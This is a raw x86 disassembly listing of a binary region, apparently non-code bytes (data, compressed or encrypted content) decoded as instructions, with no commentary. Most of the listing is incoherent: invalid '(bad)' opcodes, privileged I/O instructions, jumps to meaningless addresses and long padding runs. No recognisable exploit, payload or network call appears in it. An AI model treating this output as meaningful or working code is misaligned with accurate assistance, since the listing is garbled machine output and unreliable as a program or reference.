  409103:	jmp    0xe7ed6575
  409108:	fisubr DWORD PTR cs:[edx-0x3518e320]
  40910f:	fsub   DWORD PTR [esp+eiz*8]
  409112:	lods   eax,DWORD PTR ds:[esi]
  409113:	add    cl,BYTE PTR [esi+0x5c]
  409116:	rcl    BYTE PTR [eax+0x51],cl
  409119:	dec    edi
  40911a:	repz jp 0x40911e
  40911d:	sbb    ebx,DWORD PTR [edi-0x63e3d8ea]
  409123:	pop    es
  409124:	cli    
  409125:	inc    edi
  409126:	shl    BYTE PTR [eax],0xa
  409129:	or     eax,0x71671398
  40912e:	mov    ah,0x75
  409130:	fs jns 0x409133
  409133:	add    BYTE PTR [eax],al
  409135:	add    BYTE PTR [eax],al
  409137:	jmp    FWORD PTR [ecx-0x6d]
  40913a:	jge    0x40915d
  40913c:	js     0x4091b3
  40913e:	outs   dx,DWORD PTR ds:[esi]
  40913f:	cli    
  409140:	je     0x4091a5
  409142:	jne    0x409188
  409144:	gs ja  0x4091b9
  409147:	in     eax,0x72
  409149:	pop    ecx
  40914a:	and    BYTE PTR [eax],0x2c
  40914d:	cwde   
  40914e:	jno    0x409137
  409150:	addr16 ja 0x4091af
  409153:	push   ebx
  409154:	or     eax,0x48f345a5
  409159:	dec    ecx
  40915a:	push   ecx
  40915b:	or     eax,0xd8605a50
  409160:	sbb    edx,DWORD PTR [esi+0x3d44df5a]
  409166:	pop    ebp
  409167:	(bad)  
  409168:	push   edi
  409169:	push   ebp
  40916a:	or     eax,0x494a4ed5
  40916f:	icebp  
  409170:	pop    ebp
  409171:	sub    eax,0x25bfa2bd
  409176:	mov    ebx,0xa7b4bf66
  40917b:	xor    al,0xc4
  40917d:	jmp    0xb4ff0979
  409182:	mov    bl,0x2e
  409184:	stos   DWORD PTR es:[edi],eax
  409185:	clc    
  409186:	push   es
  409187:	mov    edx,edx
  409189:	test   al,0xc2
  40918b:	and    al,0xbe
  40918d:	into   
  40918e:	ret    
  40918f:	xor    eax,0x9ac1ffaf
  409194:	aad    0x7c
  409196:	mov    ebp,0x95778513
  40919b:	add    BYTE PTR [eax],al
  40919d:	add    BYTE PTR [eax],al
  40919f:	add    BYTE PTR [esi],al
  4091a1:	test   DWORD PTR [edi],esp
  4091a3:	xchg   edi,eax
  4091a4:	fst    DWORD PTR [ecx-0x73075495]
  4091aa:	jp     0x40922b
  4091ac:	jmp    0xf9f40e3e
  4091b1:	test   BYTE PTR [ebp+0x75],ch
  4091b4:	repnz lds esp,FWORD PTR [eax-0x14]
  4091b8:	jae    0x4091a4
  4091ba:	xor    bh,ah
  4091bc:	je     0x4091b8
  4091be:	push   cs
  4091bf:	sub    DWORD PTR cs:[ebp-0x9951701],edi
  4091c6:	push   es
  4091c7:	cmp    eax,0xdd739434
  4091cc:	push   ecx
  4091cd:	call   0xffb5a4d9
  4091d2:	adc    dl,dh
  4091d4:	push   cs
  4091d5:	mov    bl,0x0
  4091d7:	add    DWORD PTR [esp+ecx*8],ebx
  4091da:	cmp    ecx,DWORD PTR [ecx]
  4091dc:	cmp    eax,0x4bdb63d4
  4091e1:	iret   
  4091e2:	daa    
  4091e3:	dec    DWORD PTR [ecx-0x30]
  4091e6:	pop    ds
  4091e7:	fldcw  WORD PTR [ebx]
  4091e9:	fld    DWORD PTR [eax]
  4091eb:	fldenv [esi+ebx*8]
  4091ee:	ds mov edi,0xfa32df17
  4091f4:	cli    
  4091f5:	nop
  4091f6:	xor    esp,DWORD PTR [ebp+0x69cb26b1]
  4091fc:	push   0xa439a05c
  409201:	inc    eax
  409202:	aam    0x5f
  409204:	add    BYTE PTR [eax],al
  409206:	add    BYTE PTR [eax],al
  409208:	add    BYTE PTR [ecx+0x6532c733],ch
  40920e:	addr16 int 0x2d
  409211:	mov    al,ds:0x9000c834
  409216:	mov    esi,0xd19a98cd
  40921b:	rcr    ah,0x5e
  40921e:	sti    
  40921f:	stc    
  409220:	in     al,dx
  409221:	cmp    cl,ah
  409223:	(bad)  
  409224:	aad    0x80
  409226:	in     al,0xf3
  409228:	jecxz  0x409298
  40922a:	cmc    
  40922b:	lock out 0x3f,eax
  40922e:	jmp    0x409226
  409230:	icebp  
  409231:	xchg   edx,eax
  409232:	ret    0xf4f3
  409235:	mov    dh,al
  409237:	mov    ah,0xba
  409239:	cmp    eax,0x22fef1f0
  40923e:	mov    ebp,eax
  409240:	aad    0x78
  409242:	fdiv   st(7),st
  409244:	jmp    DWORD PTR [eax]
  409246:	std    
  409247:	jmp    0x41df43
  40924c:	add    bh,ch
  40924e:	cwde   
  40924f:	mov    ecx,0x978bde8c
  409254:	test   BYTE PTR [eax+0x50000083],ch
  40925a:	sub    dh,BYTE PTR [eax]
  40925c:	cmp    DWORD PTR ds:0x7d7e3e34,edi
  409262:	(bad)  
  409263:	(bad)  
  409264:	call   DWORD PTR [esi+esi*1]
  409267:	and    al,0x2d
  409269:	cmp    DWORD PTR [eax],esp
  40926b:	sub    bh,BYTE PTR [eax+eax*1]
  40926e:	add    BYTE PTR [eax],al
  409270:	add    BYTE PTR [eax],al
  409272:	jb     0x40929a
  409274:	sub    ebp,DWORD PTR [edx]
  409276:	sbb    al,0x1
  409278:	add    BYTE PTR [eax],al
  40927a:	xor    edi,DWORD PTR [ecx]
  40927c:	sub    al,0x3b
  40927e:	ins    BYTE PTR es:[edi],dx
  40927f:	and    eax,0x3e6f003e
  409284:	push   ebp
  409285:	inc    esp
  409286:	call   0x554a:0xbc754843
  40928d:	inc    eax
  40928e:	sbb    BYTE PTR [ebp+0x57],cl
  409291:	add    BYTE PTR [ebp+0x11],dh
  409294:	out    0x2f,eax
  409296:	pop    edx
  409297:	add    dl,dh
  409299:	xor    edx,DWORD PTR [esi+0x1b]
  40929c:	add    eax,DWORD PTR [eax]
  40929e:	jne    0x40924b
  4092a0:	jne    0x409230
  4092a2:	out    dx,al
  4092a3:	(bad)  
  4092a4:	or     ch,BYTE PTR [ebx-0xda1325c]
  4092aa:	xchg   esp,eax
  4092ab:	neg    BYTE PTR ds:0x3e97fdf6
  4092b1:	shl    BYTE PTR [ebp+0x27],0xdb
  4092b5:	sub    ch,BYTE PTR [ecx+ecx*1]
  4092b8:	jmp    0x35bffc1
  4092bd:	add    BYTE PTR [ebp-0x14],dh
  4092c0:	fidiv  DWORD PTR cs:[esi+0x62d210f4]
  4092c7:	push   es
  4092c8:	sbb    eax,0xa566de8
  4092cd:	std    
  4092ce:	push   esp
  4092cf:	and    cl,BYTE PTR [eax+eax*1]
  4092d2:	jne    0x409305
  4092d4:	or     esi,ebp
  4092d6:	add    BYTE PTR [eax],al
  4092d8:	add    BYTE PTR [eax],al
  4092da:	add    BYTE PTR [ecx+0x63],ah
  4092dd:	sub    eax,0x366828eb
  4092e2:	shl    BYTE PTR [ebp+0x66],1
  4092e5:	rcr    BYTE PTR es:[eax],1
  4092e8:	ds or  dh,cl
  4092eb:	sub    eax,0x75f51b4d
  4092f0:	fisttp DWORD PTR [eax-0x592b708e]
  4092f6:	lods   eax,DWORD PTR gs:[esi]
  4092f8:	loopne 0x4092bb
  4092fa:	popa   
  4092fb:	mov    edi,0xb14399c9
  409300:	jmp    0xd8ece7bf
  409305:	add    eax,DWORD PTR [eax]
  409307:	jne    0x4092b6
  409309:	test   BYTE PTR [edx-0x22d9a006],al
  40930f:	jne    0x409313
  409311:	enter  0x6387,0x88
  409315:	fmulp  st(5),st
  409317:	jp     0x4092fa
  409319:	call   0x4f430821
  40931e:	and    edx,ebp
  409320:	sbb    eax,0x82e38264
  409325:	jmp    0x6d43082d
  40932a:	push   ebp
  40932b:	out    0x54,al
  40932d:	jg     0x409381
  40932f:	fisttp WORD PTR [edx+0x55]
  409332:	dec    esp
  409333:	(bad)  [ecx+0x46]
  409336:	add    al,0x75
  409338:	add    bh,ah
  40933a:	loop   0x409393
  40933c:	loope  0x409315
  40933e:	fiadd  WORD PTR [eax]
  409340:	add    BYTE PTR [eax],al
  409342:	add    BYTE PTR [eax],al
  409344:	inc    edi
  409345:	add    dh,BYTE PTR [esi]
  409347:	sbb    eax,0x3e9128b
  40934c:	jne    0x409350
  40934e:	push   edx
  40934f:	dec    esi
  409350:	sub    DWORD PTR [ebx+0x30],edx
  409353:	push   ebx
  409354:	pop    ds
  409355:	adc    BYTE PTR [ebp+0x5b],ch
  409358:	pop    ss
  409359:	dec    esp
  40935a:	jmp    0x22430862
  40935f:	sahf   
  409360:	(bad)  
  409361:	cmp    DWORD PTR [edi],0xffffffa3
  409364:	int3   
  409365:	loopne 0x40939b
  409367:	mov    al,ds:0x99389ece
  40936c:	cmp    al,BYTE PTR [ebx]
  40936e:	sbb    DWORD PTR [edx-0x4cf35b4a],ebp
  409374:	lds    eax,FWORD PTR [edx]
  409376:	xchg   DWORD PTR [esp+ecx*8+0x5a],ecx
  40937a:	pop    esp
  40937b:	pop    esp
  40937c:	int3   
  40937d:	inc    edx
  40937e:	xchg   BYTE PTR [ebp-0x1d],bh
  409381:	pop    edi
  409382:	inc    eax
  409383:	(bad)  
  409384:	fcom   DWORD PTR [esi+0x44]
  409387:	add    esi,DWORD PTR [ebp+0x2]
  40938a:	mov    es,WORD PTR [esp+ebp*8+0x19]
  40938e:	add    BYTE PTR [ebx+esi*4-0x535938c7],ah
  409395:	cmp    al,BYTE PTR [eax-0x35c3cba0]
  40939b:	cmp    dh,BYTE PTR [esi+0x2]
  40939e:	add    BYTE PTR [edx],dl
  4093a0:	les    esp,FWORD PTR [ebp-0x1a380fc5]
  4093a6:	adc    bl,dl
  4093a8:	add    BYTE PTR [eax],al
  4093aa:	add    BYTE PTR [eax],al
  4093ac:	add    al,bl
  4093ae:	out    0x53,al
  4093b0:	or     al,0xcb
  4093b2:	lock sbb eax,0x6a95e1ee
  4093b8:	jmp    0x34409633
  4093bd:	dec    ebp
  4093be:	add    al,BYTE PTR [eax]
  4093c0:	in     al,dx
  4093c1:	lea    esp,[ecx+0x276be56]
  4093c7:	add    BYTE PTR [eax-0xb],ah
  4093ca:	jp     0x409359
  4093cc:	pop    ecx
  4093cd:	or     dh,BYTE PTR [eax-0x62]
  4093d0:	jmp    0x7040964b
  4093d5:	sbb    al,0x5b
  4093d7:	pop    esi
  4093d8:	popf   
  4093d9:	sub    DWORD PTR ds:0x5f27477a,edx
  4093df:	push   edi
  4093e0:	cmp    al,0xc
  4093e2:	push   ebx
  4093e3:	add    BYTE PTR [ebx-0x390b0b9a],bh
  4093e9:	xchg   edi,eax
  4093ea:	mov    edx,0xf86ebcd0
  4093ef:	sti    
  4093f0:	mov    bh,0x61
  4093f2:	cld    
  4093f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f4:	mov    cl,BYTE PTR [edi+eiz*8-0x11783f1c]
  4093fb:	out    dx,eax
  4093fc:	fwait
  4093fd:	mov    al,ds:0xbc4fff85
  409402:	scas   eax,DWORD PTR es:[edi]
  409403:	mov    ah,0x45
  409405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409406:	mov    al,0xb0
  409408:	dec    eax
  409409:	lods   al,BYTE PTR ds:[esi]
  40940a:	mov    ecx,0x60c00e5
  40940f:	add    BYTE PTR [eax],al
  409411:	add    BYTE PTR [eax],al
  409413:	add    BYTE PTR [eax],al
  409415:	add    BYTE PTR ds:0x993a3dca,ch
  40941b:	stc    
  40941c:	sbb    BYTE PTR [edx],bl
  40941e:	aad    0x0
  409420:	or     al,0x16
  409422:	call   0xdc529925
  409427:	out    dx,al
  409428:	adc    ebx,DWORD PTR [edx+0x11]
  40942b:	in     eax,dx
  40942c:	nop    edx
  40942f:	icebp  
  409430:	adc    al,0x16
  409432:	sbb    BYTE PTR [eax-0x3c29acab],bh
  409438:	(bad)  
  409439:	(bad)  
  40943a:	cld    
  40943b:	dec    ecx
  40943c:	mov    esi,0x9b7a88bb
  409441:	fwait
  409442:	and    al,0x82
  409444:	mov    edx,DWORD PTR [edi-0x6c787ff7]
  40944a:	or     eax,0x58c19470
  40944f:	jle    0x4093de
  409451:	call   0x3e1d:0x9e93670e
  409458:	aam    0xd2
  40945a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40945b:	sbb    esp,esi
  40945d:	jmp    0x4093f7
  40945f:	pop    edx
  409460:	mov    ebp,0xb05703bc
  409465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409466:	push   ebp
  409467:	push   ds
  409468:	jecxz  0x40941e
  40946a:	xor    al,BYTE PTR es:[eax]
  40946d:	add    BYTE PTR [edi+0x2],cl
  409470:	add    BYTE PTR ds:0x113f15b,bl
  409476:	pop    ds
  409477:	icebp  
  409478:	adc    al,0x56
  40947a:	add    BYTE PTR [eax],al
  40947c:	add    BYTE PTR [eax],al
  40947e:	add    BYTE PTR [edx],ah
  409480:	mov    bl,0x9
  409482:	or     al,BYTE PTR [ecx-0x49]
  409485:	add    al,0xe
  409487:	and    bl,bh
  409489:	inc    edi
  40948a:	adc    BYTE PTR [edi+edi*8+0xb],dh
  40948e:	pop    es
  40948f:	jne    0x409477
  409491:	add    cl,BYTE PTR [eax]
  409493:	jge    0x40946e
  409495:	add    al,BYTE PTR [eax]
  409497:	jne    0x4094ef
  409499:	sub    dh,BYTE PTR [ebp+0x2eac0]
  40949f:	jne    0x4094b6
  4094a1:	mov    edi,DWORD PTR [ecx+0x68]
  4094a4:	add    BYTE PTR [ecx-0x6e19c3d1],bl
  4094aa:	jge    0x40950d
  4094ac:	loope  0x409438
  4094ae:	jno    0x409453
  4094b0:	add    al,0x97
  4094b2:	jb     0x409508
  4094b4:	shl    al,1
  4094b6:	sub    al,0x4d
  4094b8:	rcr    DWORD PTR [esi-0x6043ab94],1
  4094be:	pop    es
  4094bf:	sub    ebx,0x2
  4094c2:	add    BYTE PTR [ebp+0x25],dh
  4094c5:	sbb    al,0xe5
  4094c7:	mov    ds:0xd6fb2112,eax
  4094cc:	xor    eax,0x579af30a
  4094d1:	pop    edi
  4094d2:	mov    ds:0x717680,al
  4094d7:	jne    0x409528
  4094d9:	push   esp
  4094da:	les    ebp,FWORD PTR [esi+0x3bc9412f]
  4094e0:	and    bl,BYTE PTR [eax+eax*1+0x0]
  4094e4:	add    BYTE PTR [eax],al
  4094e6:	add    BYTE PTR [eax],al
  4094e8:	jne    0x409551
  4094ea:	or     esp,eax
  4094ec:	pop    ecx
  4094ed:	shr    cl,1
  4094ef:	cld    
  4094f0:	push   eax
  4094f1:	jo     0x4094f7
  4094f3:	add    BYTE PTR [ebp+0x76],dh
  4094f6:	div    edi
  4094f8:	push   ecx
  4094f9:	leave  
  4094fa:	out    dx,al
  4094fb:	call   0xa312:0xefa8bb75
  409502:	xor    DWORD PTR [ebx-0x484f8c15],0xffffffdb
  409509:	retf   0xfbfd
  40950c:	out    dx,al
  40950d:	add    dh,BYTE PTR [edi+edx*4-0x19a85e20]
  409514:	fidiv  DWORD PTR [eax-0x73240ab]
  40951a:	xor    ebx,0x899ac4bc
  409520:	sar    DWORD PTR [ebx-0x693a55b8],1
  409526:	push   esi
  409527:	mov    cs,WORD PTR [esi]
  409529:	leave  
  40952a:	ja     0x409520
  40952c:	mov    esi,0x7503e8ab
  409531:	add    al,BYTE PTR [edi-0x14]
  409534:	fsub   st(4),st
  409536:	push   edx
  409537:	repz fdiv st,st(5)
  40953a:	dec    esp
  40953b:	add    al,0x75
  40953d:	add    ch,bh
  40953f:	sbb    esi,DWORD PTR [ecx+0x48]
  409542:	jmp    0xa4430a4a
  409547:	popa   
  409548:	dec    esp
  409549:	add    ah,BYTE PTR [edi-0x2b]
  40954c:	add    BYTE PTR [eax],al
  40954e:	add    BYTE PTR [eax],al
  409550:	add    bh,bh
  409552:	(bad)  
  409553:	jo     0x4094dc
  409555:	shl    BYTE PTR [eax-0x72622292],0x34
  40955c:	test   DWORD PTR [edx-0xe358a01],ecx
  409562:	xchg   esi,eax
  409563:	sub    ecx,DWORD PTR [esi+0x3e8c8e5]
  409569:	jne    0x40956d
  40956b:	jge    0x409570
  40956d:	shr    BYTE PTR [ebx-0x17],cl
  409570:	add    esi,DWORD PTR [ebp+0x2]
  409573:	lods   al,BYTE PTR ds:[esi]
  409574:	mov    ah,0x29
  409576:	sti    
  409577:	loopne 0x409570
  409579:	or     bl,dl
  40957b:	stos   DWORD PTR es:[edi],eax
  40957c:	add    esi,DWORD PTR [ebp+0x2]
  40957f:	(bad)  
  409580:	stc    
  409581:	push   ebp
  409582:	xchg   edx,eax
  409583:	pop    edx
  409584:	(bad)  
  409585:	cmp    bh,bh
  409587:	cwde   
  409588:	leave  
  409589:	dec    eax
  40958a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40958b:	dec    DWORD PTR [ebx+0x53feff22]
  409591:	out    dx,eax
  409592:	add    BYTE PTR [eax-0x3023c14b],0x70
  409599:	sub    bh,bh
  40959b:	(bad)  
  40959c:	daa    
  40959d:	popf   
  40959e:	pushw  0x96fd
  4095a2:	push   ebx
  4095a3:	sub    edi,DWORD PTR [eax-0x4bd8a4c2]
  4095a9:	mov    dl,0x5f
  4095ab:	and    eax,eax
  4095ad:	xchg   esi,eax
  4095ae:	inc    ebx
  4095af:	add    BYTE PTR [eax+0x6],ah
  4095b2:	popf   
  4095b3:	inc    DWORD PTR [edx+0x0]
  4095b6:	add    BYTE PTR [eax],al
  4095b8:	add    BYTE PTR [eax],al
  4095ba:	scas   eax,DWORD PTR es:[edi]
  4095bb:	mov    al,0x3f
  4095be:	jbe    0x4095c2
  4095c0:	add    cl,ah
  4095c2:	gs add eax,0x257ef11
  4095c8:	add    BYTE PTR [edx],cl
  4095ca:	jle    0x40960a
  4095cc:	jge    0x4095db
  4095ce:	pop    edi
  4095cf:	xor    bh,BYTE PTR [ecx]
  4095d1:	mov    edi,0x6c000276
  4095d6:	loop   0x40958e
  4095d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d9:	pop    esi
  4095da:	retf   
  4095db:	rcr    al,0x3a
  4095de:	(bad)  
  4095e0:	mov    al,ds:0x9883e069
  4095e5:	xor    eax,0xe9bdc9a7
  4095ea:	jbe    0x4095ee
  4095ec:	add    BYTE PTR [edi],cl
  4095ee:	xor    edx,esi
  4095f0:	in     al,dx
  4095f1:	xor    eax,0x4bbbef6d
  4095f6:	sbb    al,0xab
  4095f8:	cld    
  4095f9:	rcr    DWORD PTR [edx-0x2],1
  4095fc:	(bad)  
  4095fd:	hlt    
  4095fe:	ins    DWORD PTR es:[edi],dx
  4095ff:	sub    DWORD PTR ds:0x276f0,ebx
  409605:	push   cs
  409606:	add    BYTE PTR [ebx+ebx*1],0x0
  40960a:	sbb    eax,0x41000002
  40960f:	div    ecx
  409611:	imul   dh
  409613:	mov    esp,0xa7fbadaa
  409618:	call   0xed1c9d09
  40961d:	call   0x409622
  409622:	add    dl,ch
  409624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409625:	lods   al,BYTE PTR ds:[esi]
  409626:	mov    al,ds:0xf0f4c3bc
  40962b:	repnz lods eax,DWORD PTR ds:[esi]
  40962d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962e:	test   al,0xa4
  409630:	mov    eax,0x9109e9f8
  409635:	cwde   
  409636:	hlt    
  409637:	sbb    dh,cl
  409639:	retf   0x14d6
  40963c:	out    0xbe,eax
  40963e:	leave  
  40963f:	mov    cl,al
  409641:	jg     0x409643
  409643:	push   eax
  409644:	mov    al,ds:0x64c94a0
  409649:	add    BYTE PTR [eax],al
  40964b:	rol    DWORD PTR [edi],cl
  40964d:	add    DWORD PTR [esp+ecx*8],eax
  409650:	dec    ecx
  409651:	pop    esi
  409652:	pop    edi
  409653:	mov    al,ds:0x95091e1e
  409658:	and    dl,BYTE PTR [edi]
  40965a:	or     al,0xc9
  40965c:	and    al,BYTE PTR [esi]
  40965e:	or     ebx,DWORD PTR [ebp-0x23b5b0e9]
  409664:	xor    bl,BYTE PTR [eax]
  409666:	sbb    BYTE PTR [edi-0x4de3f8ee],bl
  40966c:	xor    al,0x34
  40966e:	and    BYTE PTR [esi+0x397f3f3c],dh
  409674:	cmp    eax,0x352e733b
  409679:	cmp    eax,0x6f78133d
  40967e:	and    BYTE PTR [eax+0x7d292033],al
  409684:	or     ebp,DWORD PTR [ecx]
  409686:	jno    0x409688
  409688:	add    BYTE PTR [eax],al
  40968a:	add    BYTE PTR [eax],al
  40968c:	jne    0x4096d8
  40968e:	add    al,0x0
  409690:	jne    0x4096db
  409692:	gs ror DWORD PTR fs:[esp+ebp*2+0x6a],cl
  409698:	sahf   
  409699:	dec    edi
  40969a:	outs   dx,DWORD PTR ds:[esi]
  40969b:	outs   dx,BYTE PTR ds:[esi]
  40969c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40969d:	cmp    dh,BYTE PTR [esi+0x73]
  4096a0:	test   eax,0x9f787935
  4096a5:	or     ah,BYTE PTR [edi+0x69]
  4096a8:	mov    ds:0x75007b16,al
  4096ad:	and    dh,BYTE PTR [ebp+0x57]
  4096b0:	xchg   edx,eax
  4096b1:	adc    al,0x3a
  4096b3:	xor    al,0xa5
  4096b5:	stc    
  4096b6:	outs   dx,DWORD PTR ds:[esi]
  4096b7:	arpl   WORD PTR [eax-0x8],bx
  4096ba:	jae    0x4096bc
  4096bc:	jne    0x409687
  4096be:	add    ah,BYTE PTR ds:0x2202f875
  4096c4:	jne    0x4096b1
  4096c6:	add    al,BYTE PTR [eax]
  4096c8:	jne    0x4096d3
  4096ca:	add    al,0x25
  4096cc:	jne    0x4096a6
  4096ce:	add    ah,BYTE PTR [edx]
  4096d0:	jne    0x4096dd
  4096d2:	add    al,0x25
  4096d4:	jne    0x40968e
  4096d6:	add    al,BYTE PTR [eax]
  4096d8:	jne    0x409690
  4096da:	jae    0x409741
  4096dc:	daa    
  4096dd:	into   
  4096de:	jo     0x409756
  4096e0:	push   ebx
  4096e1:	(bad)  
  4096e2:	outs   dx,BYTE PTR ds:[esi]
  4096e3:	ins    BYTE PTR es:[edi],dx
  4096e4:	jne    0x40968e
  4096e6:	je     0x40974d
  4096e8:	adc    al,0x97
  4096ea:	gs inc ebp
  4096ec:	sbb    ebx,DWORD PTR [ebp+0x7269]
  4096f2:	add    BYTE PTR [eax],al
  4096f4:	add    BYTE PTR [edx],dl
  4096f6:	jge    0x409766
  4096f8:	or     edi,DWORD PTR gs:[edi+0x45]
  4096fc:	ins    BYTE PTR es:[edi],dx
  4096fd:	loop   0x409687
  4096ff:	imul   eax,DWORD PTR [eax],0x75
  409702:	lods   eax,DWORD PTR ds:[esi]
  409703:	gs jae 0x4096ef
  409706:	ja     0x409778
  409708:	jns    0x4096ba
  40970a:	add    dl,BYTE PTR [edi+0x76]
  40970d:	fdiv   QWORD PTR [eax+0x4e]
  409710:	outs   dx,BYTE PTR ds:[esi]
  409711:	fsub   DWORD PTR [ebp+0x47]
  409714:	js     0x4096cd
  409716:	outs   dx,BYTE PTR ds:[esi]
  409717:	ds arpl si,cx
  40971a:	add    al,BYTE PTR [ebx]
  40971c:	push   0x69450880
  409721:	cdq    
  409722:	and    cl,BYTE PTR [ebx]
  409724:	sub    DWORD PTR [esi-0x73f623e0],esp
  40972a:	fs leave 
  40972c:	push   0x781a698d
  409731:	push   ebp
  409732:	and    ah,cl
  409734:	jb     0x40978d
  409736:	and    al,BYTE PTR [esi]
  409738:	outs   dx,DWORD PTR ds:[esi]
  409739:	sub    DWORD PTR [ebx-0x37],0xb027567
  409740:	add    al,0x54
  409742:	add    bh,ch
  409744:	add    esi,DWORD PTR [ebp+0x2]
  409747:	sub    DWORD PTR [ecx+0x56],ebp
  40974a:	push   0xffffffd6
  40974c:	and    esp,DWORD PTR [edx+0x64]
  40974f:	(bad)  
  409750:	adc    BYTE PTR [edi+0x25],bh
  409753:	ficom  DWORD PTR [eax]
  409755:	outs   dx,DWORD PTR ds:[esi]
  409756:	les    bp,DWORD PTR [edi+0x0]
  40975a:	add    BYTE PTR [eax],al
  40975c:	add    BYTE PTR [eax],al
  40975e:	xchg   ebp,eax
  40975f:	sub    ebp,DWORD PTR [edi-0x45daa8dd]
  409765:	and    DWORD PTR [eax+0x8],edi
  409768:	jmp    0xfe430c70
  40976d:	add    edx,DWORD PTR [esi]
  40976f:	add    cl,cl
  409771:	add    edx,DWORD PTR [edi+0x2]
  409774:	les    eax,FWORD PTR [ebx]
  409776:	push   es
  409777:	add    cl,bl
  409779:	add    esi,DWORD PTR [ebp+0x2]
  40977c:	stos   BYTE PTR es:[edi],al
  40977d:	add    ecx,DWORD PTR [edx]
  40977f:	add    dl,BYTE PTR [ebx+eax*1+0x37902c6]
  409786:	rol    BYTE PTR [edx],1
  409788:	add    BYTE PTR [edx-0x16fffd8a],cl
  40978e:	jbe    0x409792
  409790:	add    cl,ch
  409792:	jbe    0x409796
  409794:	add    cl,ch
  409796:	jbe    0x40979a
  409798:	add    cl,ch
  40979a:	jbe    0x40979d
  40979c:	add    BYTE PTR [ecx],bl
  40979e:	jg     0x4097d2
  4097a0:	add    BYTE PTR [esi+0x7200405b],bl
  4097a6:	gs inc eax
  4097a8:	add    BYTE PTR [ecx],al
  4097aa:	push   ebx
  4097ab:	inc    eax
  4097ac:	add    BYTE PTR [edx],dl
  4097ae:	dec    ebx
  4097af:	inc    eax
  4097b0:	add    BYTE PTR [ebx-0x54ffbfa0],dl
  4097b6:	inc    edx
  4097b7:	inc    eax
  4097b8:	add    BYTE PTR [ebp+0x3c],al
  4097bb:	inc    eax
  4097bc:	add    BYTE PTR [ecx],ah
  4097be:	ds inc eax
  4097c0:	add    BYTE PTR [ecx+0x0],dl
  4097c6:	add    BYTE PTR [edi-0x5542ffc0],ch
  4097cc:	inc    eax
  4097cd:	add    dh,dh
  4097cf:	mov    ds:0x9f810040,al
  4097d4:	inc    eax
  4097d5:	add    BYTE PTR [edi+ecx*4+0x40],ah
  4097d9:	add    BYTE PTR [ebx-0x7effbfd7],cl
  4097df:	xor    eax,0x358a0040
  4097e4:	inc    eax
  4097e5:	add    BYTE PTR [edx-0x75ffbfcb],cl
  4097eb:	xor    eax,0x35810040
  4097f0:	inc    eax
  4097f1:	add    BYTE PTR [edx+0x51004035],cl
  4097f7:	xor    eax,0x35660040
  4097fc:	inc    eax
  4097fd:	add    BYTE PTR [ecx+0x59],bh
  409800:	add    al,BYTE PTR [eax]
  409802:	mov    esp,0x7476
  409807:	pop    esp
  409808:	push   es
  409809:	add    BYTE PTR [eax],al
  40980b:	mov    ds:0x12004250,eax
  409810:	pop    esi
  409811:	inc    edx
  409812:	add    al,bh
  409814:	pop    ebp
  409815:	inc    edx
  409816:	add    BYTE PTR [edi+0x5d],al
  409819:	inc    edx
  40981a:	add    BYTE PTR [ebp+ebx*2+0x5db90042],bl
  409821:	inc    edx
  409822:	add    bl,ch
  409824:	pop    ebp
  409825:	inc    edx
  409826:	add    BYTE PTR [edi+0x424f],dl
  40982c:	add    BYTE PTR [eax],al
  40982e:	add    BYTE PTR [eax],al
  409830:	pop    ds
  409831:	dec    edi
  409832:	inc    edx
  409833:	add    BYTE PTR [edi+0x4f],ah
  409836:	inc    edx
  409837:	add    ah,cl
  409839:	popa   
  40983a:	inc    edx
  40983b:	add    BYTE PTR [ecx],bl
  40983d:	pop    esp
  40983e:	inc    edx
  40983f:	add    BYTE PTR [ecx-0x1dffbda4],ch
  409845:	pop    esp
  409846:	inc    edx
  409847:	add    BYTE PTR [ecx+0x5b],bl
  40984a:	inc    edx
  40984b:	add    al,ah
  40984d:	pop    ecx
  40984e:	inc    edx
  40984f:	add    BYTE PTR [ebx],ch
  409851:	push   edx
  409852:	add    BYTE PTR [eax],al
  409854:	sub    ebx,DWORD PTR [edx+0x43]
  409857:	add    BYTE PTR [ebx],cl
  409859:	dec    ebp
  40985a:	add    BYTE PTR [eax],al
  40985c:	mov    edi,0xbe006105
  409861:	add    eax,0x5ba0069
  409866:	add    BYTE PTR gs:[eax-0x3fffd1fb],ah
  40986d:	add    eax,0x5b8006c
  409872:	add    BYTE PTR [eax],al
  409874:	rol    BYTE PTR [edx+0x49],cl
  409877:	inc    ebx
  409878:	fisub  WORD PTR [eax+0x61]
  40987b:	je     0x40987e
  40987d:	push   es
  40987e:	add    BYTE PTR [eax],al
  409880:	rol    BYTE PTR [edx+0x49],cl
  409883:	inc    ecx
  409884:	jne    0x40980d
  409886:	inc    si
  409888:	or     al,0x77
  40988a:	data16 add BYTE PTR [ebp-0x57],dh
  40988e:	aas    
  40988f:	dec    ecx
  409890:	mov    bl,0x87
  409892:	jne    0x409907
  409894:	add    BYTE PTR [eax],al
  409896:	add    BYTE PTR [eax],al
  409898:	add    ch,cl
  40989a:	lods   al,BYTE PTR ds:[esi]
  40989b:	popa   
  40989c:	(bad)  
  40989d:	int3   
  40989e:	jns    0x409906
  4098a0:	je     0x409917
  4098a2:	sub    DWORD PTR [ecx+0x49],eax
  4098a5:	mov    cl,0x3e
  4098a7:	jno    0x40991d
  4098a9:	mov    DWORD PTR [eax+0x7b],0x54747500
  4098b0:	inc    edx
  4098b1:	jne    0x409931
  4098b3:	mov    edi,0x673b7540
  4098b8:	inc    edx
  4098b9:	jne    0x409866
  4098bb:	gs inc edx
  4098bd:	jne    0x4098b8
  4098bf:	add    ah,BYTE PTR [ebp+esi*2+0xa]
  4098c3:	add    al,0x74
  4098c5:	jne    0x4098b2
  4098c7:	add    al,BYTE PTR [eax]
  4098c9:	jne    0x409907
  4098cb:	add    al,0x65
  4098cd:	jne    0x40990b
  4098cf:	add    al,0x68
  4098d1:	jne    0x4098c9
  4098d3:	add    dh,BYTE PTR [ebp+esi*2-0x1]
  4098d7:	add    ebp,DWORD PTR [edi+0x75]
  4098da:	clc    
  4098db:	add    ch,BYTE PTR [esi+0x75]
